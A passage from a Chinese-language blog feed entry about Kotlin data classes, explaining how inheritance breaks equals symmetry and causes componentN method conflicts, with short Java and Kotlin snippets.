class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设有 Admin 类继承 User 类, 那么下面这个例子就违反了对称性。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Admin a;</span><br><span class="line">User b;</span><br><span class="line">b.equals(a) == <span class="keyword">true</span>; <span class="comment">//Admin a is instanceof(User)</span></span><br><span class="line">a.equals(b) == <span class="keyword">false</span>; <span class="comment">//User b is not instanceof(Admin)s</span></span><br></pre></td></tr></table></figure><p>情况复杂起来了，是不是？</p><p>另外，子类如果修改了构造函数的参数顺序，生成的 <code>componentN</code> 方法会发生冲突。</p><p>比如下面这个例子</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="class"><span class="keyword">class</span> <span class="title">Derived</span></span>(<span class="keyword">val</span> c: C, b: B, a: A) : Base(a, b)</span><br></pre></td></tr></table></figure><p>Derived 类继承的<code>component1(): A</code>会和生成的<code>component1(): C</code>冲突</p><p>所以在遇到复杂的需要人工干预<code>equals、hashCode</code>的情况时，kotlin直接限制了data class 相关的能力。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍kotlin的特性如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;data class&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Android" scheme="https://deskid.github.io/categories/Android/"/>
    
      <category term="kotlin" scheme="https://deskid.github.io/categories/Android/kotlin/"/>
    
    
      <category term="kotlin" scheme="https://deskid.github.io/tags/kotlin/"/>
    
  </entry>
  
</feed>
